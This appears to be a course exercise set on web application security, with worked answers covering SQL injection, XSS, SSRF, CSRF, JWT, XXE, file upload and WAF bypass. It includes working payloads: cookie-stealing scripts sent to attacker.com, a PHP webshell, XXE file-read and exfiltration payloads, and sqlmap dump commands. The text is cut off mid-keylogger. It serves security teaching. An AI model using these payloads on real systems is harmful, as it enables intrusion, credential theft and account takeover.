# Month 8 — Practice Exercises: Web Application Security

**25 exercises with worked answers.**

---

## Section A: OWASP Top 10 and HTTP (Questions 1-8)

**Q1.** Explain the OWASP Top 10 (2021). For each of the 10 categories, name one real-world example of that vulnerability type.

**Answer:**

| # | Category | Real-World Example |
|---|----------|-------------------|
| A01 | Broken Access Control | IDOR allowing any user to view/edit another user's bank account by changing account ID in URL |
| A02 | Cryptographic Failures | Password stored as unsalted MD5 hash; Wi-Fi captured traffic readable |
| A03 | Injection | SQL injection in login form allows `' OR 1=1--` to bypass authentication |
| A04 | Insecure Design | Password reset link never expires; design flaw, not implementation bug |
| A05 | Security Misconfiguration | Apache server showing detailed error pages with stack traces in production |
| A06 | Vulnerable and Outdated Components | Running Log4j 2.14 after Log4Shell (CVE-2021-44228) was disclosed |
| A07 | Identification and Authentication Failures | No MFA on admin panel; account lockout missing → brute force possible |
| A08 | Software and Data Integrity Failures | CI/CD pipeline pulls dependencies without verifying integrity hashes |
| A09 | Security Logging and Monitoring Failures | Successful break-in goes undetected for 60 days because no SIEM alerts |
| A10 | Server-Side Request Forgery | URL preview feature fetches AWS metadata endpoint `169.254.169.254` |

---

**Q2.** You are testing a web application login form. Describe your complete testing methodology for SQL injection, from identification through data extraction.

**Answer:**
**Step 1 — Identification (does SQL injection exist?):**
```
Username field tests:
1' → Causes SQL syntax error? → SQLi likely
1" → Same test with double quote
' OR 1=1-- → Returns "welcome" without password? → Boolean-based SQLi
' AND 1=2-- → Returns "login failed" (different behaviour)? → Confirmed boolean SQLi
```

**Step 2 — Determine injection type:**
```
String-based: username' → error (injecting into a string context)
Numeric: if input is directly in SQL: username = 1 → try: 1 OR 1=1
```

**Step 3 — Find column count (for UNION attacks):**
```
' ORDER BY 1-- → works (column 1 exists)
' ORDER BY 2-- → works  
' ORDER BY 3-- → error (only 2 columns)
```

**Step 4 — Identify which columns display in response:**
```
' UNION SELECT NULL, NULL-- (2 columns from above)
' UNION SELECT 'test1', 'test2'-- → 'test1' appears in response? → column 1 is displayed
```

**Step 5 — Extract database information:**
```sql
' UNION SELECT database(), user()--        → current DB name and DB user
' UNION SELECT table_name, NULL FROM information_schema.tables WHERE table_schema=database()--
' UNION SELECT column_name, NULL FROM information_schema.columns WHERE table_name='users'--
' UNION SELECT username, password FROM users--
```

**Step 6 — Confirm with SQLMap (automated):**
```bash
sqlmap -u "http://target.com/login" --data="username=test&password=test" -p username \
  --dbs --dump
```

---

**Q3.** What is the difference between stored XSS and reflected XSS? Which is more dangerous and why? Give the attack chain for each.

**Answer:**
**Reflected XSS:**
```
1. Attacker crafts malicious URL:
   https://bank.com/search?q=<script>document.location='https://attacker.com/steal?c='+document.cookie</script>
2. Attacker sends this URL to victim (phishing email, social media)
3. Victim clicks the link
4. Server reflects the query parameter in the response HTML
5. Browser executes the script in the context of bank.com
6. Victim's session cookie sent to attacker
7. Attacker uses cookie to impersonate victim
```

**Stored XSS:**
```
1. Attacker posts a comment on a forum: 
   "Great post! <script>document.location='https://attacker.com/steal?c='+document.cookie</script>"
2. Application stores this in the database without sanitisation
3. Every user who views that forum page gets the script injected into their browser
4. Mass cookie theft — attacker gets sessions of ALL viewers, not just one tricked victim
```

**Which is more dangerous:** Stored XSS, because:
- Affects every user who views the page — one attack can compromise thousands
- No victim interaction required beyond viewing the page (no need to click a link)
- Persists until removed from database
- Can work on admin users who visit the page, potentially leading to privilege escalation

---

**Q4.** A developer says "I sanitise user input with `htmlspecialchars()` in PHP, so I'm safe from XSS." Is this true? Are there cases where this is still insufficient?

**Answer:** `htmlspecialchars()` is the right tool for HTML BODY context, but is insufficient in other contexts.

**Where it works:** When inserting user input between HTML tags:
```html
<p><?php echo htmlspecialchars($user_input); ?></p>
<!-- < → &lt;  > → &gt;  " → &quot;  ' → &#039;  & → &amp; -->
```

**Where it's NOT sufficient:**

**1. JavaScript context:**
```html
<script>
var searchTerm = "<?php echo $user_input; ?>";
// Input: "; alert(1); var x="
// Result: var searchTerm = ""; alert(1); var x="";
// htmlspecialchars doesn't help — we're already inside a script tag
</script>
```

**2. URL context (href attributes):**
```html
<a href="<?php echo $user_url; ?>">Click here</a>
<!-- Input: javascript:alert(1) 
     htmlspecialchars doesn't encode colons or slashes
     Result: <a href="javascript:alert(1)">Click here</a> — executes JS! -->
```

**3. CSS context:**
```html
<div style="background: url(<?php echo $input; ?>)">
<!-- Input: javascript:expression(alert(1)) (IE8 and older)
     htmlspecialchars doesn't help in CSS context -->
```

**4. DOM-based XSS (client-side):**
```javascript
document.getElementById("output").innerHTML = location.hash.substring(1);
// No PHP involved — server-side sanitisation doesn't help here
// location.hash comes from the URL, never touches the server
```

**Correct approach:** Context-aware output encoding for each output context, plus CSP to limit what scripts can execute.

---

**Q5.** Explain Server-Side Request Forgery (SSRF) from first principles. Why is the cloud metadata endpoint `169.254.169.254` so dangerous in SSRF vulnerabilities?

**Answer:**
**SSRF mechanics:** A web application receives a URL from user input and makes a server-side HTTP request to that URL. Normally designed to: fetch URL previews, resize images from URLs, import data from APIs. The attacker changes the URL to something unintended.

**Why it's dangerous:** The request originates FROM THE SERVER. The server's IP address can access:
- Internal services that are not exposed to the internet (Redis, internal APIs, databases on private IPs)
- Cloud provider metadata endpoints
- The server's own localhost services

**Why `169.254.169.254` is catastrophic in cloud environments:**
```
169.254.169.254 is the "link-local" metadata endpoint provided by:
- AWS EC2: http://169.254.169.254/latest/meta-data/
- Azure VMs: http://169.254.169.254/metadata/instance
- GCP: http://metadata.google.internal/computeMetadata/v1/

These endpoints return:
- Instance identity (region, account ID, instance ID)
- Instance user-data (may contain deployment secrets)
- IAM role credentials including:
  - Access Key ID
  - Secret Access Key  
  - Session Token (temporary credentials valid for hours)
```

**Attack chain:**
```
1. URL fetch vulnerability found: POST /preview {"url": "..."}
2. Attacker sends: {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/"}
3. Response reveals IAM role name: "my-app-role"
4. Attacker sends: {"url": "http://169.254.169.254/latest/meta-data/iam/security-credentials/my-app-role"}
5. Response includes: AccessKeyId, SecretAccessKey, Token (valid for hours)
6. Attacker uses these credentials from their own machine to access all AWS resources the role permits
```

---

**Q6.** What is a Content Security Policy (CSP) header? Write a CSP for a web application that includes a CDN for scripts, inline styles are necessary, and no external images are needed.

**Answer:**
**CSP:** An HTTP response header that tells browsers which sources of content are allowed. The browser enforces these restrictions, preventing malicious scripts from executing even if XSS is present.

**CSP directives:**
- `default-src 'self'`: Fallback — only load resources from the same origin
- `script-src`: Where scripts can be loaded from
- `style-src`: Where stylesheets can be loaded from
- `img-src`: Where images can be loaded from
- `connect-src`: Where XHR/fetch/WebSocket can connect to
- `frame-src`: What can be embedded in iframes
- `report-uri /csp-report`: Where to send CSP violation reports

**For the described app:**
```http
Content-Security-Policy: 
  default-src 'self';
  script-src 'self' https://cdn.jsdelivr.net https://cdnjs.cloudflare.com;
  style-src 'self' 'unsafe-inline';
  img-src 'self' data:;
  connect-src 'self';
  font-src 'self' https://fonts.gstatic.com;
  object-src 'none';
  base-uri 'self';
  form-action 'self';
  frame-ancestors 'none';
  upgrade-insecure-requests;
  report-uri /api/csp-violations
```

**Notes:**
- `'unsafe-inline'` in `style-src` allows inline styles (required by the spec)
- `'unsafe-inline'` for scripts would defeat CSP — use nonces instead if inline scripts needed
- `'none'` for `object-src` blocks Flash, Java plugins
- `frame-ancestors 'none'` prevents clickjacking (better than X-Frame-Options)
- `upgrade-insecure-requests` upgrades HTTP subresource loads to HTTPS

---

**Q7.** What is Cross-Site Request Forgery (CSRF)? Write an example HTML page that would perform a CSRF attack, and explain how CSRF tokens prevent it.

**Answer:**
**CSRF:** Tricking a logged-in user's browser into making an unintended HTTP request to a site where they are authenticated — using the browser's automatic cookie sending.

**Why it works:** When a browser makes a request to example.com, it automatically attaches all cookies for example.com (including the session cookie). The attacker can't READ these cookies, but they don't need to — the request is made with the victim's credentials.

**CSRF attack example — a malicious page:**
```html
<!-- Attacker's page: evil.com/attack.html -->
<!DOCTYPE html>
<html>
<body>
  <!-- Option 1: Image tag (GET request CSRF) -->
  <img src="https://bank.com/transfer?to=attacker&amount=50000" 
       style="display:none">
  
  <!-- Option 2: Auto-submitting form (POST CSRF) -->
  <form id="csrf" action="https://bank.com/transfer" method="POST">
    <input type="hidden" name="to" value="attacker_account">
    <input type="hidden" name="amount" value="50000">
  </form>
  <script>document.getElementById('csrf').submit();</script>
  
  <!-- Victim clicks a link, page loads, transfer is sent using their session -->
</body>
</html>
```

**How CSRF tokens prevent this:**
```python
# Server generates a random token per session/request
import secrets
csrf_token = secrets.token_hex(32)
session['csrf_token'] = csrf_token

# Token is embedded in every form
# <input type="hidden" name="csrf_token" value="{{csrf_token}}">

# On form submission, server checks:
if request.form.get('csrf_token') != session['csrf_token']:
    abort(403)  # CSRF token mismatch → reject request
```

**Why this works:** The attacker's HTML form doesn't know the CSRF token (can't read cookies or HTML from the victim's other tabs due to Same-Origin Policy). Without the token, the POST request is rejected.

---

**Q8.** Explain the Same-Origin Policy (SOP) and how CORS relaxes it. What is a dangerous CORS misconfiguration?

**Answer:**
**Same-Origin Policy:** Browser security rule: JavaScript on `origin-a.com` cannot read responses from requests to `origin-b.com`. "Origin" = protocol + hostname + port. Requests CAN be sent cross-origin (CSRF exploits this), but the RESPONSE cannot be read by the sending script.

**Why SOP exists:** Without it, a malicious site could embed your banking page in an iframe and read all your financial data using JavaScript.

**CORS (Cross-Origin Resource Sharing):** A mechanism for a server to EXPLICITLY opt in to cross-origin access by including response headers:
```http
Access-Control-Allow-Origin: https://trusted-app.com
Access-Control-Allow-Credentials: true    # Allow cookies/auth to be sent
Access-Control-Allow-Methods: GET, POST
```

**Dangerous CORS misconfiguration #1 — Wildcard with credentials:**
```http
# IMPOSSIBLE in the spec, but some frameworks implement it incorrectly:
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
# This would allow ANY website to make credentialed requests and read responses
```

**Dangerous CORS misconfiguration #2 — Reflected origin without validation:**
```python
# Server code that dynamically sets ACAO without validation:
origin = request.headers.get('Origin')
response.headers['Access-Control-Allow-Origin'] = origin  # Any origin is trusted!
response.headers['Access-Control-Allow-Credentials'] = 'true'
```
**Attack:** Attacker sends request with `Origin: https://evil.com` → server reflects it → evil.com can read the credentialed response.

**Dangerous CORS misconfiguration #3 — Overly broad regex:**
```python
import re
if re.match(r'https://.*\.company\.com', origin):
    # Matches: https://evil.company.com AND https://evil.attacker.com.company.com
```

---

## Section B: Burp Suite and Manual Testing (Questions 9-15)

**Q9.** Describe how you would test for IDOR (Insecure Direct Object Reference) in an e-commerce application. Give the specific Burp Suite steps.

**Answer:**
**Setup:**
1. Create two test accounts (User A and User B)
2. Configure Burp Suite proxy in browser

**Step-by-step IDOR testing:**

**1. Map the attack surface in Burp:**
```
- Browse all features as User A: view orders, profile, invoices, messages
- Note all IDs in URLs and request bodies:
  GET /api/orders/7823
  GET /profile?user_id=15421
  POST /api/messages/read {"message_id": 88234}
```

**2. Use Burp Repeater for manual testing:**
```
- Send each request to Repeater
- Change the object ID to another user's ID
  GET /api/orders/7823 → GET /api/orders/7824
- Observe: Does the response contain User A's data? → IDOR!
```

**3. Multi-account testing with Burp Authorize extension (Pro) or manually:**
```
- Log out and log back in as User B
- Copy User A's session cookie
- In Repeater, replace User B's cookie with User A's cookie
- Try to access User B's resources using User A's cookie → horizontal IDOR
```

**4. ID prediction (if IDs are sequential):**
```
- If your order ID is 7823, try: 7820, 7821, 7822, 7824, 7825
- Try: 1 (first ever order in the system), 2, 3...
- Try UUIDs? Less likely but check if UUID is derived from predictable input
```

**5. Try HTTP verb tampering:**
```
GET /api/orders/7824        → 403 Forbidden
POST /api/orders/7824       → 200 OK? (sometimes different methods bypass controls)
```

**Document the finding:**
- Request (including your session cookie)
- Response (showing another user's data)
- Screenshot of both accounts in separate browser windows for clarity

---

**Q10.** What is JWT and how do you test for JWT vulnerabilities? Write a Python script that decodes a JWT without verifying the signature.

**Answer:**
**JWT Structure:**
```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4iLCJpYXQiOjE1MTYyMzkwMjJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
     ↑ header (base64url)                                           ↑ payload (base64url)                                                         ↑ signature
```

**Python JWT decoder:**
```python
import base64
import json

def decode_jwt(token: str) -> dict:
    """Decode JWT without signature verification — for testing only."""
    parts = token.split('.')
    if len(parts) != 3:
        raise ValueError("Invalid JWT format")
    
    def decode_part(part: str) -> dict:
        # Add padding if needed (base64url doesn't use padding)
        padding = 4 - len(part) % 4
        if padding != 4:
            part += '=' * padding
        decoded = base64.urlsafe_b64decode(part)
        return json.loads(decoded)
    
    return {
        "header": decode_part(parts[0]),
        "payload": decode_part(parts[1]),
        "signature": parts[2],
        "full_token": token
    }

# Vulnerability tests:
def test_algorithm_none(token: str) -> str:
    """Create an 'alg: none' JWT — server should reject this."""
    parts = token.split('.')
    
    # Modify header to use alg: none
    new_header = base64.urlsafe_b64encode(
        json.dumps({"alg": "none", "typ": "JWT"}).encode()
    ).rstrip(b'=').decode()
    
    # Keep same payload, remove signature
    return f"{new_header}.{parts[1]}."

# Usage
jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..."
decoded = decode_jwt(jwt)
print(f"Header: {decoded['header']}")
print(f"Payload: {decoded['payload']}")

# Test if the server accepts alg: none
modified = test_algorithm_none(jwt)
print(f"\n[!] Test this token: {modified}")
print("[!] If server accepts this → JWT algorithm validation is broken")
```

**Other JWT attacks to test:**
- `hashcat -m 16500 jwt_token.txt rockyou.txt` — brute force weak HMAC secret
- Change `"role": "user"` to `"role": "admin"` in payload, see if accepted (no sig verification)
- RS256 → HS256 confusion (sign with public key as HMAC secret)

---

**Q11.** What is an HTTP Request Smuggling vulnerability? Explain the CL.TE and TE.CL variants.

**Answer:** HTTP Request Smuggling exploits discrepancies in how front-end (load balancer/WAF) and back-end servers parse HTTP requests — specifically the ambiguity between `Content-Length` and `Transfer-Encoding` headers.

**Background:** HTTP/1.1 has two ways to specify request body length:
- `Content-Length: 30` — body is exactly 30 bytes
- `Transfer-Encoding: chunked` — body is sent in chunks, terminated by `0\r\n\r\n`

If the front-end uses one method and back-end uses another, they disagree on where requests end.

**CL.TE (Front-end uses Content-Length, back-end uses Transfer-Encoding):**
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED
```
Front-end sees CL=13: sends `0\r\n\r\nSMUGGLED` (13 bytes). 
Back-end uses TE: sees chunk size `0`, then `SMUGGLED` is left in buffer = prefix of NEXT request.

**TE.CL (Front-end uses Transfer-Encoding, back-end uses Content-Length):**
```http
POST / HTTP/1.1
Host: vulnerable.com
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0
```
Front-end uses TE: forwards entire chunked body.
Back-end uses CL=3: reads only `8\r\n`, leaves `SMUGGLED\r\n0\r\n\r\n` in buffer.

**Impact:** Bypass WAF/security controls, steal other users' requests, cache poisoning, account hijacking.

---

**Q12.** You are testing a file upload feature. What are the security checks you perform, and what is your methodology for testing for file upload bypass?

**Answer:**
**Attack objectives via file upload:**
1. Upload a webshell (e.g., PHP file that executes commands)
2. Upload a file that causes path traversal when processed
3. Upload an XSS payload (SVG with embedded script)
4. Upload a very large file (DoS)

**Testing methodology:**

**1. Identify what filetypes are allowed:**
```
Upload a .php file → blocked? Note the error message.
Upload .phtml, .php5, .phar → some servers execute these
Upload .jpg (legitimate) → accepted for baseline
```

**2. MIME type bypass:**
```
Upload evil.php with Burp — intercept the request
Change Content-Type: text/x-php to Content-Type: image/jpeg
→ Does the server check only MIME type? → Upload bypassed
```

**3. Double extension:**
```
evil.php.jpg → web server may execute .php based on the .php extension before .jpg
evil.php%00.jpg → null byte terminates at .php (old PHP versions)
evil.jpg.php
evil.php7 (if PHP 7.x handler catches all .php* extensions)
```

**4. Magic bytes bypass:**
```
# File starts with GIF magic bytes (47 49 46 38) but contains PHP
GIF89a;
<?php system($_GET['cmd']); ?>
# Save as evil.gif → upload as image → if server accepts image magic bytes
# and also serves the file with executable permissions → webshell
```

**5. Test where the file is uploaded to:**
```
If uploaded to /uploads/evil.php — can you access https://target.com/uploads/evil.php?
If served from CDN/S3 — PHP won't execute there (not a PHP server) — less dangerous
```

**6. Test for path traversal in filename:**
```
In Burp, change filename parameter: 
../../../var/www/html/evil.php
%2F%2E%2E%2Fevil.php (URL-encoded path traversal)
```

---

**Q13.** What is a "Broken Authentication" vulnerability (OWASP A07)? Describe 4 specific authentication weaknesses and how to test for each.

**Answer:**

**1. No account lockout after failed attempts:**
```
Test: Use Burp Intruder to send 100 login attempts with wrong passwords.
Expected (secure): After 5-10 attempts, account locked or CAPTCHA required.
Vulnerable: All 100 attempts succeed (no lockout) → brute force possible.
```

**2. Weak password reset token:**
```
Test: Request password reset for two accounts, compare the tokens.
Expected (secure): Cryptographically random, no relation between tokens.
Vulnerable: Token = base64(username) → predictable, or token = timestamp → guessable.
Also test: Request reset, wait 24 hours, use the reset link → should be expired.
```

**3. Session not invalidated after logout:**
```
Test: 
1. Log in → copy session cookie
2. Click logout
3. Manually set session cookie back in browser → refresh page
Expected (secure): Redirected to login (session invalid).
Vulnerable: Page loads with your session still active → logout is client-side only.
```

**4. Predictable session tokens:**
```
Test: Log in 10 times with different accounts, collect all session tokens.
Use "Sequencer" in Burp Suite to analyse randomness:
- Collect 100+ tokens via Burp's session handling
- Burp → Sequencer → Manual → paste tokens → Analyse
Expected: Effective entropy > 64 bits. 
Vulnerable: Tokens based on timestamp, sequential numbers, or user ID → predictable.
```

---

**Q14.** Explain the difference between authentication and authorisation. Give 3 real-world examples where authentication succeeds but authorisation fails.

**Answer:**
**Authentication:** Verifying WHO you are. "Are you really Alice?"
**Authorisation:** Determining WHAT you're allowed to do. "Is Alice allowed to do this?"

Authentication failing = unauthorised access to the system.
Authorisation failing = authenticated user accessing resources they shouldn't.

**3 Real-world examples:**

**1. Horizontal IDOR in a healthcare portal:**
Nurse A authenticates successfully with their credentials. They then access `GET /api/patients/12345/records`. Patient 12345 is not their patient. The system didn't check if Nurse A has authorisation for THAT specific patient — only that they're a logged-in nurse. Authentication: ✓. Authorisation: ✗

**2. Admin endpoint without role check:**
Regular user authenticates. They navigate to `/admin/all-users`. The admin panel only checks for authentication (`is_logged_in=True`), not the user's role (`is_admin=True`). The user sees all customer data. Authentication: ✓. Authorisation: ✗

**3. API missing server-side role validation:**
Mobile app shows "Delete Account" button only in admin version of the app. But the API endpoint `DELETE /api/users/{id}` doesn't validate the user's role — it only validates the session token. A regular user can decompile the app, find the endpoint, and call it directly via curl with their valid session. Authentication: ✓. Authorisation: ✗

**Key lesson:** Security through obscurity fails for authorisation. Every sensitive action must be authorised server-side, regardless of what the UI shows.

---

**Q15.** Write a Python script that tests for reflected XSS in a URL parameter by sending payloads and checking if they appear unescaped in the response.

**Answer:**
```python
import requests, html, re
from urllib.parse import urlparse, urlencode, parse_qs, urlunparse

XSS_PAYLOADS = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(1)</script>',
    "'><script>alert(1)</script>",
    'javascript:alert(1)',
    '<SCRIPT>alert(1)</SCRIPT>',     # Uppercase bypass
    '<scr<script>ipt>alert(1)</scr</script>ipt>',  # Nested tags
    '&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;',  # HTML entities
]

def check_xss_reflection(base_url: str, param: str) -> list:
    """Test a URL parameter for reflected XSS."""
    results = []
    session = requests.Session()
    
    parsed = urlparse(base_url)
    qs = parse_qs(parsed.query)
    
    for payload in XSS_PAYLOADS:
        # Inject payload into target parameter
        qs_modified = dict(qs)
        qs_modified[param] = [payload]
        new_query = urlencode(qs_modified, doseq=True)
        test_url = urlunparse(parsed._replace(query=new_query))
        
        try:
            response = session.get(test_url, timeout=5)
            response_text = response.text
            
            # Check 1: Is the exact payload in the response? (unescaped reflection)
            if payload in response_text:
                results.append({
                    "status": "VULNERABLE",
                    "payload": payload,
                    "url": test_url,
                    "note": "Exact payload reflected unescaped"
                })
            
            # Check 2: Is the payload HTML-escaped?
            escaped = html.escape(payload)
            if escaped in response_text and payload not in response_text:
                results.append({
                    "status": "SAFE (escaped)",
                    "payload": payload,
                    "url": test_url,
                    "note": "Payload escaped — not directly exploitable"
                })
            
            # Check 3: Is the payload partially reflected? (may be exploitable)
            # Look for script tags without the angle brackets
            if '<script>' not in response_text and 'alert' in response_text:
                results.append({
                    "status": "PARTIAL_REFLECTION",
                    "payload": payload,
                    "url": test_url,
                    "note": "Partial reflection — may be exploitable with encoding bypass"
                })
                
        except requests.RequestException as e:
            results.append({"status": "ERROR", "payload": payload, "error": str(e)})
    
    return results

# Usage (only on systems you own or are authorised to test)
# results = check_xss_reflection("http://dvwa.local/vulnerabilities/xss_r/?name=test", "name")
# for r in results:
#     print(f"[{r['status']}] {r.get('note', '')} — Payload: {r['payload'][:50]}")
```

---

## Section C: Advanced Web Attacks (Questions 16-20)

**Q16.** What is a race condition vulnerability in a web application? Give an example in a banking context and explain how to test for it using Burp Suite.

**Answer:** A race condition occurs when the application's behaviour depends on the sequence or timing of events, and a security-relevant action has a time gap between "check" and "use" (TOCTOU — Time of Check to Time of Use).

**Banking example:**
```
Vulnerable withdrawal code:
1. Check: Does user have balance >= withdrawal amount?
2. [Time gap here]
3. Deduct withdrawal from balance
4. Send money

Attack: Send 10 simultaneous withdrawal requests for 100% of balance
- All 10 requests pass the balance check before any deductions are processed
- All 10 complete the deduction
- User withdraws 10x their balance
```

**Testing with Burp Suite:**
```
1. Capture the withdrawal request in Burp Proxy
2. Send to Repeater → duplicate the tab 10 times
3. In Burp Pro: Select all tabs → Send in parallel (Group Send → Send all in parallel)
4. OR: Use Burp Intruder with "threads" set to 10+ and all sending the same payload

Alternative (Python + threading):
import requests, threading, time

def make_request(session, url, data):
    response = session.post(url, data=data)
    print(f"Status: {response.status_code}, Response: {response.text[:100]}")

session = requests.Session()
# Set session cookies/auth here

threads = []
for _ in range(20):
    t = threading.Thread(
        target=make_request,
        args=(session, 'https://target.com/transfer', {'amount': '100', 'to': 'account123'})
    )
    threads.append(t)

# Launch all simultaneously
[t.start() for t in threads]
[t.join() for t in threads]
```

**Signs of exploitation:** Multiple requests succeed when only one should, balance goes negative, credits applied multiple times.

---

**Q17.** What is XML External Entity (XXE) injection? Write a proof-of-concept payload to read `/etc/passwd` on a Linux server.

**Answer:** XXE occurs when an XML parser processes external entity declarations — allowing attacker-controlled references to external resources (local files, internal URLs, etc.).

**When XXE occurs:** Any feature processing XML: SOAP web services, XML file upload, API endpoints accepting XML Content-Type, SVG image processing, Office document parsing.

**Proof of concept payloads:**
```xml
<!-- Payload 1: Read /etc/passwd (Linux) -->
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <username>&xxe;</username>
</root>

<!-- Payload 2: Read Windows SAM file -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>
<root>&xxe;</root>

<!-- Payload 3: SSRF via XXE (reach internal services) -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY xxe SYSTEM "http://169.254.169.254/latest/meta-data/">
]>
<root>&xxe;</root>

<!-- Payload 4: Blind XXE (out-of-band exfiltration when response isn't reflected) -->
<?xml version="1.0"?>
<!DOCTYPE root [
  <!ENTITY % xxe SYSTEM "http://attacker.com/evil.dtd">
  %xxe;
]>
<root>&exfil;</root>

<!-- attacker.com/evil.dtd: -->
<!ENTITY % data SYSTEM "file:///etc/passwd">
<!ENTITY % wrapper "<!ENTITY exfil SYSTEM 'http://attacker.com/collect?d=%data;'>">
%wrapper;
```

**Testing:** If a request accepts XML, try replacing a text parameter with an XXE payload. If the server responds with file contents → XXE exists.

**Defence:** Disable external entity processing in the XML parser:
```python
# Python - lxml
from lxml import etree
parser = etree.XMLParser(resolve_entities=False, no_network=True)

# Java - DocumentBuilderFactory
dbf = DocumentBuilderFactory.newInstance()
dbf.setFeature("http://xml.org/sax/features/external-general-entities", False)
dbf.setFeature("http://xml.org/sax/features/external-parameter-entities", False)
```

---

**Q18.** What is a security misconfiguration vulnerability (OWASP A05)? Give 5 examples of security misconfigurations in a web application context.

**Answer:**

**1. Detailed error messages in production:**
```
Django DEBUG=True in production:
When an error occurs, the page shows:
- Full stack trace
- Python code around the error
- All settings.py values (including SECRET_KEY, DATABASE passwords)
→ Fix: Set DEBUG=False, implement custom error pages
```

**2. Default admin credentials:**
```
/admin → login with admin:admin or admin:password
Many IoT devices, network equipment, CMS installations (WordPress wp-admin, Joomla admin)
have default credentials that are publicly documented.
→ Fix: Change defaults on first setup; scan for defaults in your environment
```

**3. Directory listing enabled:**
```
GET https://example.com/images/
Returns: Index of /images/
[DIR] thumbnails/
[FILE] internal-document.pdf
[FILE] employee-list-2024.csv
→ Fix: Disable directory listing in web server config (Apache: Options -Indexes)
```

**4. Unnecessary HTTP methods enabled:**
```
OPTIONS https://example.com/api/users → Response: Allow: GET, POST, PUT, DELETE, TRACE
TRACE method: echoes request back → can enable XST (Cross-Site Tracing) to steal cookies
→ Fix: Disable TRACE, limit allowed methods to only those needed
```

**5. Sensitive files exposed:**
```
https://example.com/.git/config → Reveals repository info, sometimes credentials
https://example.com/backup.zip → Source code backup
https://example.com/phpinfo.php → PHP configuration, paths, installed modules
https://example.com/.env → Environment file with API keys, database credentials
→ Fix: Web server rules to block /.git, never upload backups to web root
```

---

**Q19.** What is the difference between a web application firewall (WAF) and a regular network firewall? What are WAF bypass techniques?

**Answer:**
**Network Firewall:** Operates at Layer 3/4 (IP/TCP). Can filter by: source/destination IP, port number, protocol. Cannot inspect the content of encrypted HTTPS traffic or HTTP application data.

**WAF (Web Application Firewall):** Operates at Layer 7 (HTTP). Inspects actual request content: URL parameters, request body, headers, cookies. Understands HTTP protocols — can detect SQL injection patterns, XSS, path traversal in request content.

**What WAFs protect against:** Signature-based detection of common attacks (SQLi, XSS, known vulnerability scanners).

**WAF bypass techniques:**

**1. Encoding/obfuscation:**
```sql
# URL encoding
' OR 1=1-- → %27%20OR%201%3D1--
# Double URL encoding  
%27 → %2527
# Unicode normalisation
SELECT → SeLeCt, SELECтT (using Cyrillic т)
```

**2. Case and whitespace manipulation:**
```sql
SELECT → SeLeCt
SELECT * FROM users → SELECT/**/ * /**/FROM/**/users
# Comments as whitespace
1 UNION SELECT 1,2-- → 1 UNION/**/SELECT/**/1,2--
```

**3. HTTP parameter pollution:**
```
?id=1&id=2
# Some servers use the first value, WAF inspects the last → bypass
```

**4. Chunked encoding abuse:**
```
Transfer-Encoding: chunked
# Split the attack across multiple chunks
# WAF may not reassemble; backend does → WAF never sees complete attack
```

**5. JSON/alternate content types:**
```
WAF inspects form data but not JSON body?
Content-Type: application/json
{"username": "admin'--"}
```

---

**Q20.** Write a complete Burp Suite testing checklist for a REST API endpoint that accepts user-supplied JSON and returns user profile data.

**Answer:**

---
**REST API Security Testing Checklist**

**Target endpoint:** `POST /api/v1/profile/view`

**1. Authentication and Authorisation:**
- [ ] Remove `Authorization` header entirely → does the API still respond? (No auth check)
- [ ] Use an expired JWT → does the API reject it?
- [ ] Use another user's valid JWT → can you view their profile?
- [ ] Change `user_id` in the request body to another user's ID → IDOR?
- [ ] Try an admin `user_id` (1, 0, admin, superuser)

**2. Input Validation:**
- [ ] Inject SQLi into each string field: `"name": "test' OR 1=1--"`
- [ ] Inject NoSQLi: `"user_id": {"$gt": 0}` (MongoDB operator injection)
- [ ] Inject XSS payloads into string fields (even if not displayed — check if stored)
- [ ] Send negative numbers, zero, null, very large numbers for numeric fields
- [ ] Send 10,000 character strings for string fields (buffer overflow/DoS check)
- [ ] Send unexpected data types: string instead of integer, array instead of string
- [ ] Send extra unexpected fields: `"role": "admin"`, `"credit": 9999` (mass assignment)

**3. HTTP Method Testing:**
- [ ] GET /api/v1/profile/view → Does it respond to GET even though designed for POST?
- [ ] HEAD /api/v1/profile/view → Does HEAD return sensitive headers?
- [ ] OPTIONS → What methods are allowed? (Verify only necessary methods)
- [ ] PUT/PATCH/DELETE → Can you modify or delete via unexpected methods?

**4. Content Type Testing:**
- [ ] Send `Content-Type: application/xml` with XML body → XXE injection possible?
- [ ] Send `Content-Type: text/plain` → Does API still parse the body?
- [ ] Remove `Content-Type` header → What happens?

**5. Response Analysis:**
- [ ] Check for sensitive data in response (internal IDs, passwords, tokens)
- [ ] Check for debug information (stack traces, version numbers)
- [ ] Check response headers for security headers (CORS policy, CSP, etc.)
- [ ] Check if error responses leak different info than success responses

**6. Rate Limiting:**
- [ ] Send 100 requests rapidly → Is there rate limiting?
- [ ] What's the API key/session limit per time window?

---

## Section D: Career and Bug Bounty (Questions 21-25)

**Q21.** You've found an XSS vulnerability in a bug bounty programme where you can only execute `alert()`. The security team says this is low severity because "it just shows an alert box." How do you escalate the impact to demonstrate it's actually high severity?

**Answer:** An `alert()` proves XSS is present but demonstrates only minimal impact. The security team is wrong that it's low severity — they're conflating the proof-of-concept (PoP) with the actual risk.

**Escalation demonstrations to prove real impact:**

**1. Cookie theft (demonstrates account takeover if cookies are not HttpOnly):**
```javascript
document.location='https://webhook.site/YOUR-ID?c='+document.cookie
// If cookies are returned → account takeover possible
// Note: don't actually use this in production — use a BurpCollaborator or your own server
```

**2. Prove HTTP-Only cookies protection bypass is NOT needed (keylogger):**
```javascript
// Even without cookie theft, you can steal credentials via keylogger
document.addEventListener('keypress', function(e){
